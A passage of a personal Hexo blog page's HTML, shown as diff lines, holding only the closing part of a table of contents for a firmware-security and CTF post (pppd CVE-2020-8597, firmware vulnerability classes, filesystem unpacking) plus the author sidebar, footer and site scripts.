href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）"><span class="nav-number">3.1.1.</span> <span class="nav-text">（a）2020 De1ctf - pppd （CVE-2020-8597）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（b）2019-0ctf-embeded-heap"><span class="nav-number">3.1.2.</span> <span class="nav-text">（b）2019 0ctf - embeded_heap</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2）ctf-中的-arm-pwn"><span class="nav-number">3.2.</span> <span class="nav-text">2）ctf 中的 arm pwn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、固件中常见安全漏洞"><span class="nav-number">4.</span> <span class="nav-text">四、固件中常见安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#栈溢出"><span class="nav-number">4.1.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行-命令注入"><span class="nav-number">4.2.</span> <span class="nav-text">命令执行 &#x2F; 命令注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拒绝服务"><span class="nav-number">4.3.</span> <span class="nav-text">拒绝服务</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、实战"><span class="nav-number">5.</span> <span class="nav-text">五、实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cpio的解包与打包："><span class="nav-number">6.</span> <span class="nav-text">cpio的解包与打包：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#squashfs解包与打包："><span class="nav-number">7.</span> <span class="nav-text">squashfs解包与打包：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ext4"><span class="nav-number">8.</span> <span class="nav-text">ext4</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shuwen"
+      src="/images/shuwen.jpg">
+  <p class="site-author-name" itemprop="name">Shuwen</p>
+  <div class="site-description" itemprop="description">做有意思的事，有意思地做事</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/warm-winter" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;warm-winter" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://kaaass.net/" title="https:&#x2F;&#x2F;kaaass.net&#x2F;" rel="noopener" target="_blank">KAAAsS</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shuwen</span>
+</div>
+	<div class="powered-by">
+		<i class="fa fa-user-md"></i>
+		<span id="busuanzi_container_site_uv">
+		  本站访客数:<span id="busuanzi_value_site_uv"></span>
+		</span>
+	</div>
+
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
